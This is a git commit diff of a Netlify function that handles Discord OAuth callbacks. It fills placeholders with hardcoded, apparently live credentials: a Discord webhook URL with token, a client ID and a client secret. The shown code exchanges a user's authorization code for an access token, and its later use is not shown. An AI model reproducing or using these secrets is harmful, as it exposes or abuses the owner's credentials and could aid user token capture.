fd850e0cb010c7d585d4a25ea5f1a6f670c0c37e
SnOObYaws <snooby99838@gmail.com>
2026-03-19 22:47:40 +0300

    Update callback.js

--- netlify/functions/callback.js
+++ netlify/functions/callback.js
@@ -2,18 +2,18 @@ const axios = require('axios');
 
 exports.handler = async (event) => {
     const code = event.queryStringParameters.code;
-    const WEBHOOK_URL = "SENIN_WEBHOOK_LINKIN";
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1484265463990063184/ERIszpXHCFMexvjVIFL3sRrAxs8YidtcsyQmyODqe0eKipGOxYPJzmnyykQPj4EqSIZs";
 
     if (!code) return { statusCode: 400, body: "No code!" };
 
     try {
         // 1. Kodu Token ile değiştir
         const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
-            client_id: 'BOT_ID_BURAYA',
-            client_secret: 'BOT_SECRET_BURAYA',
+            client_id: '1484264299995336865',
+            client_secret: 'Lk2TU5ekmrmKCV90G2m-6RTg9hzOHbQJ',
             grant_type: 'authorization_code',
             code: code,
-            redirect_uri: 'https://SİTE-ADIN.netlify.app/.netlify/functions/callback'
+            redirect_uri: 'https://vidgonet.netlify.app/.netlify/functions/callback'
         }).toString(), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
 
         const accessToken = tokenResponse.data.access_token;
